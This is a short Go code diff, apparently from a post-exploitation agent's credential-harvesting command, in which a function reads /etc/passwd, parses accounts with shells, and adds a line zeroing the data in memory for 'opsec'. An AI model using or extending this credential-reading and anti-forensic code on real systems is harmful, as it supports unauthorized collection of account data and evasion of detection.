@@ -58,6 +58,7 @@ func credShadow(args credHarvestArgs) structs.CommandResult {
 	// /etc/passwd — check for password hashes in passwd (legacy)
 	sb.WriteString("\n--- /etc/passwd (accounts with shells) ---\n")
 	if data, err := os.ReadFile("/etc/passwd"); err == nil {
+		defer structs.ZeroBytes(data) // opsec: clear passwd data from memory
 		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
 		entries := parsePasswdLines(lines, args.User)
 		for _, e := range entries {
